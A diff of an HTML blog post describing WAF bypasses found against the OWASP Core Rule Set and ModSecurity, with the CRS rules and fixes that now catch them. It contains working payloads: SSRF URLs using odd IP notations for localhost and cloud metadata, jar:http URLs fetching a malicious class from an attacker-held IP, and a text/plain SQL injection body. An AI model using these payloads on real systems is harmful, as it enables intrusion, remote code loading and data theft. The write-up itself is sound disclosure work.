@@ -183,30 +183,30 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 </span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//%</span><span style="color:#ae81ff">31</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">30</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">30</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">31</span>
 </span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">1.0</span>x0<span style="color:#ae81ff">.00000000.0</span>x1
 </span></span></code></pre></div><p>If you&rsquo;re bamboozled and scratching your head over how this is possible, I&rsquo;d suggest you to read the <a href="https://linux.die.net/man/3/inet_aton"><code>inet_aton(3)</code></a> manual.</p>
-<p>When an SSRF exploit involves localhost IP addresses, the Core Rule Set (CRS) attempts to block these to prevent exploitation. However, bypasses can still be crafted. For instance:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>http://127.1 <span style="color:#f92672">(</span>equivalent of 127.0.0.1<span style="color:#f92672">)</span>
+<p>When an SSRF exploit involves localhost IP addresses, the Core Rule Set (CRS) attempts to block these to prevent exploitation. A simple bypass for the blacklisted <code>127.0.0.1</code> looks like the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>http://127.1
 </span></span></code></pre></div><p>Similarly, the blacklist for Oracle Cloud metadata endpoint (<code>192.0.0.192</code>) can be bypassed using:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>http://192.192/<span style="color:#f92672">{</span>version<span style="color:#f92672">}</span>/metadata
-</span></span></code></pre></div><p>These techniques allow attackers to craft multiple variants of bypass payloads that evade SSRF detection.</p>
+</span></span></code></pre></div><p>Do note that this is probably the most straightforward technique. As noted earlier, you can use more creative approaches using hexadecimal notation, octal representations, and various IP encoding schemes to evade detection.</p>
 <hr>
 <p><strong>RFI</strong></p>
 <p>In Java environments, the <code>JarURLConnection</code> class permits access to the contents of a JAR file (or an entry within one) using a URL, including URLs with the <code>http</code> scheme. For example:</p>
-<pre tabindex="0"><code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/qutie.class`
-</code></pre><p>This retrieves the <code>qutie.class</code> file from the <code>baz.jar</code> archive via HTTP from <code>www.foo.com</code>.</p>
-<p>Suppose an attacker hosts a malicious JAR file on their own server hosted at <code>12.0.31.123</code> (say) and tries to exploit the target application into fetching classes directly from it. Combining this approach with alternative IP notations enables us to craft payloads such as:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>jar:http:<span style="color:#f92672">//</span><span style="color:#ae81ff">12.8059</span><span style="color:#f92672">/</span>bar<span style="color:#f92672">/</span>baz<span style="color:#f92672">.</span>jar<span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">/</span>COM<span style="color:#f92672">/</span>foo<span style="color:#f92672">/</span>qutie<span style="color:#f92672">.</span><span style="color:#66d9ef">class</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jar</span>:http:<span style="color:#f92672">//</span><span style="color:#ae81ff">201334651</span><span style="color:#f92672">/</span>bar<span style="color:#f92672">/</span>baz<span style="color:#f92672">.</span>jar<span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">/</span>COM<span style="color:#f92672">/</span>foo<span style="color:#f92672">/</span>qutie<span style="color:#f92672">.</span><span style="color:#66d9ef">class</span>
-</span></span></code></pre></div><p>Both examples resolve to the attacker-controlled IP <code>12.0.31.123</code>, allowing malicious retrieval of the qutie.class file. This effectively turns a seemingly simple URL bypass into a powerful vector for injecting untrusted code into the victim environment.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>jar:http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.0.123.234</span><span style="color:#f92672">/</span>bar<span style="color:#f92672">/</span>baz<span style="color:#f92672">.</span>jar<span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">/</span>COM<span style="color:#f92672">/</span>foo<span style="color:#f92672">/</span>qutie<span style="color:#f92672">.</span>class<span style="color:#960050;background-color:#1e0010">`</span>
+</span></span></code></pre></div><p>This retrieves the <code>qutie.class</code> file from the <code>baz.jar</code> archive via HTTP from <code>10.0.123.234</code>.</p>
+<p>Now lets say a malicious actor sets up a malicious JAR file on their server at <code>10.0.123.234</code> (which is a known blacklisted IP IOC) and tries to trick the target app into fetching classes straight from it. When you mix this trick with those sneaky IP notation bypasses we just covered, you can cook up some nasty payloads like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>jar:http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.31722</span><span style="color:#f92672">/</span>bar<span style="color:#f92672">/</span>baz<span style="color:#f92672">.</span>jar<span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">/</span>COM<span style="color:#f92672">/</span>foo<span style="color:#f92672">/</span>qutie<span style="color:#f92672">.</span><span style="color:#66d9ef">class</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jar</span>:http:<span style="color:#f92672">//</span><span style="color:#ae81ff">167803882</span><span style="color:#f92672">/</span>bar<span style="color:#f92672">/</span>baz<span style="color:#f92672">.</span>jar<span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">/</span>COM<span style="color:#f92672">/</span>foo<span style="color:#f92672">/</span>qutie<span style="color:#f92672">.</span><span style="color:#66d9ef">class</span>
+</span></span></code></pre></div><p>Both examples resolve to the attacker-controlled IP <code>10.0.123.234</code>, allowing malicious retrieval of the <code>qutie.class</code> file.</p>
 <p>At the time of writing this blogpost, the following 2 rules detect the above payloads:</p>
 <ul>
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-931-APPLICATION-ATTACK-RFI.conf#L108"><code>931130</code></a> - Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link</li>
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf#L90"><code>934110</code></a> - Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter</li>
 </ul>
 <h3 id="complete-request-body-bypass">Complete Request Body Bypass</h3>
-<p>This one deserves a special mention as it probably is the most interesting of all my findings that I stumbled upon.</p>
+<p>This one deserves a special mention as it probably is the most interesting of all the findings that I stumbled upon.</p>
 <p>When reading up documentation and source code of how ModSecurity activates inspection of rules, I found that ModSecurity employs specific body processors based upon the identified <code>Content-Type</code> header. These processors are designed to understand and break down the request body into a usable structure for rule evaluation.</p>
 <p>The JSON and XML parsers are dynamically activated by rules within the ModSecurity configuration, typically the <code>ctl:requestBodyProcessor</code> action within a <code>SecRule</code> matching the corresponding <code>Content-Type</code> header.</p>
-<p>Some parsers supported by the WAF engine are:</p>
+<p>The parsers supported by the WAF engine are:</p>
 <ul>
 <li><code>application/x-www-form-urlencoded</code>: The default behavior for forms. ModSecurity parses this into the <code>ARGS</code> (arguments) variables, accessible to rules.</li>
 <li><code>multipart/form-data</code>: Used for file uploads. This is a more complex format requiring specialized parsing to differentiate between form fields and uploaded files.</li>
@@ -248,19 +248,19 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;idkthepassword&#39; OR 1=1--&#34;</span>}
 </span></span></code></pre></div><p>The CRS project has since removed the non-standard <code>text/plain</code> from its list of allowed values within the <code>Content-Type</code> header (<a href="https://github.com/coreruleset/coreruleset/commit/6a9c854b80725a7b03be34c21ab9502ae75639f7"><code>6a9c854</code></a>) and has introduced a <a href="https://github.com/coreruleset/coreruleset/blob/main/crs-setup.conf.example#L490-L497">warning message</a> about the bypass:</p>
-<pre tabindex="0"><code># Bypass Warning: some applications may not rely on the content-type
-# request header in order to parse the request body. This could make
-# an attacker able to send malicious URLENCODED/JSON/XML payloads
-# without being detected by the WAF. Allowing request content-type
-# that doesn&#39;t activate any body processor (for example: &#34;text/plain&#34;,
-# &#34;application/x-amf&#34;, &#34;application/octet-stream&#34;, etc..) could lead
-# to a WAF bypass. For example, a malicious JSON payload submitted with
-# a &#34;text/plain&#34; content type may still be interpreted as JSON by a
-# backend application but would not trigger the JSON body parser at the
-# WAF, leading to a bypass. To avoid bypasses, you must enable the appropriate
-# body parser based on the expected data in the request bodies (For example
-# JSON for JSON data, XML for XML data, etc).
-</code></pre><p>CRS now detects such non-standard content-types via:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Bypass Warning: some applications may not rely on the content-type</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># request header in order to parse the request body. This could make</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># an attacker able to send malicious URLENCODED/JSON/XML payloads</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># without being detected by the WAF. Allowing request content-type</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># that doesn&#39;t activate any body processor (for example: &#34;text/plain&#34;,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#34;application/x-amf&#34;, &#34;application/octet-stream&#34;, etc..) could lead</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># to a WAF bypass. For example, a malicious JSON payload submitted with</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># a &#34;text/plain&#34; content type may still be interpreted as JSON by a</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># backend application but would not trigger the JSON body parser at the</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># WAF, leading to a bypass. To avoid bypasses, you must enable the appropriate</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># body parser based on the expected data in the request bodies (For example</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># JSON for JSON data, XML for XML data, etc).</span>
+</span></span></code></pre></div><p>CRS now detects such non-standard content-types via:</p>
 <ul>
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf#L935"><code>920420</code></a> - Request content type is not allowed by policy</li>
 </ul>
